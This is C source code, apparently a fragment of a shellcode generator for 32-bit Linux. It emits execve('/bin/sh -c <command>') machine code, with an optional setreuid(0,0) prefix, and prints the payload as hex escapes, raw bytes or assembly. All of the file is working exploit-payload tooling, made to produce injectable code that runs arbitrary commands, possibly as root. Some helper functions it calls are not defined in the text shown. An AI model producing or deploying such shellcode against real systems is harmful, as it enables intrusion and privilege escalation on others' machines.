#define	__HEX__		0
#define __RAW__		1
#define __ASM__		2
#define DEF_PATH	"/bin/sh"

void appcode(char *str, __u8* shc){
	int len=strlen(str), i, n;
	switch(len%4){
		case 1:
			n=2;
			memset(shc, 0x6a, 1);
			memset(shc+1, str[len-1], 1);
			break;
		case 2:
			n=5;
			memset(shc, 0x50, 1);
			memset(shc+1, 0x66, 1);
			memset(shc+2, 0x68, 1);
			memcpy(shc+3, str+len-2, 2);
			break;
		case 3:
			n=6;
			memset(shc, 0x6a, 1);
			memset(shc+1, str[len-1], 1);
			memset(shc+2, 0x66, 1);
			memset(shc+3, 0x68, 1);
			memcpy(shc+4, str+len-3, 2);
			break;
		default:
			n=1;
			memset(shc, 0x50, 1);
			break;
	}
	for(i=(len-(len%4))-4;i>=0;i-=4){
		memset(shc+n+((len-(len%4))-4-i)/4*5, 0x68, 1);
		memcpy(shc+n+((len-(len%4))-4-i)/4*5+1, str+i, 4);
	}
}
__u8* shc_gen(char *cmd, char *shell, bool setreuid, int *l){
	int len=(setreuid ? 31:24)+pushlen(strlen(shell))+pushlen(strlen(cmd)), i,n=(setreuid ? 9:2);
	__u8 *shellcode;
	__u8 setuid[] = {
			0x6a,0x46,		//push   $0x46
			0x58,			//pop    %eax
			0x31,0xdb,		//xor    %ebx,%ebx
			0x31,0xc9,		//xor    %ecx,%ecx
			0xcd,0x80		//int    $0x80
		};
	__u8 sh1[] = {
			0x31,0xc0		//xor    %eax,%eax
		};
	__u8 sh2[] = {
			0x89,0xe2,		//mov    %esp,%edx
			0x50,			//push   %eax
			0x66,0x68,0x2d,0x63,	//pushw  $0x632d
			0x89,0xe1		//mov    %esp,%ecx
		};
	__u8 sh3[] = {
			0x89,0xe3,		//mov    %esp,%ebx
			0x50,			//push   %eax
			0x52,			//push   %edx
			0x51,			//push   %ecx
			0x53,			//push   %ebx
			0x89,0xe1,		//mov    %esp,%ecx
			0x99,			//cdq
			0xb0,0x0b,		//mov    $0xb,%al
			0xcd,0x80		//int    $0x80
		};
	shellcode = (__u8*) malloc(len);
	if(setreuid) memcpy(shellcode, setuid, 9);
	else memcpy(shellcode, sh1, 2);
	appcode(cmd, shellcode+n);
	memcpy(shellcode+n+pushlen(strlen(cmd)), sh2, 9);
	appcode(shell, shellcode+n+9+pushlen(strlen(cmd)));
	memcpy(shellcode+n+9+pushlen(strlen(cmd))+pushlen(strlen(shell)), sh3, 13);
	*l=len;
	return shellcode;
}

void print_shellcode (__u8* shellcode, int len, int flag) {
	int i,byte;
	bool n=((shellcode[0]==0x6a) ? true:false);
	char *fp, *fp2, *str;
	if((n) && (flag!=__RAW__))
		printf("// [!] Warning: setreuid(0,0) to use only when possible.\n"
		       "// [!] If the setreuid fails the shellcode won't work\n\n");
	switch (flag){
		case __RAW__:
			for (i=0;i<len;i++)
				printf ("%c", shellcode[i]);
			break;
		case __HEX__:
			printf ("Shellcode length: %d\n\n", len);
			for (i=0;i<len;i++) {
				if (((i+2)%10==1)||(i==len-1))
					printf ("\\x%.2x\n", shellcode[i]);
				else
					printf ("\\x%.2x", shellcode[i]);
			}
			break;
		case __ASM__:
			fp=format_push(shellcode+(n ? 9:2), &byte);
			fp2=format_push(shellcode+(n ? 18:11)+byte, &byte);
			str = (char*) malloc (n ? 63:17);
			strcpy(str, n ?
				"\tpush\t$0x46\n"
				"\tpop\t%eax\n"
				"\txor\t%ebx,%ebx\n"
				"\txor\t%ecx,%ecx\n"
				"\tint\t$0x80\n":
				"\txor    %eax,%eax\n");
			printf (".global _start\n"
				"_start:\n"
				"%s"
				"%s"
				"\tmov\t%%esp,%%edx\n"
				"\tpush\t%%eax\n"
				"\tpushw\t$0x632d\n"
				"\tmov\t%%esp,%%ecx\n"
				"%s"
				"\tmov\t%%esp,%%ebx\n"
				"\tpush\t%%eax\n"
				"\tpush\t%%edx\n"
				"\tpush\t%%ecx\n"
				"\tpush\t%%ebx\n"
				"\tmov\t%%esp,%%ecx\n"
				"\tcdq\n"
				"\tmov\t$0xb,%%al\n"
				"\tint\t$0x80\n",str,fp,fp2);
			break;
		default:
			break;
	}
}
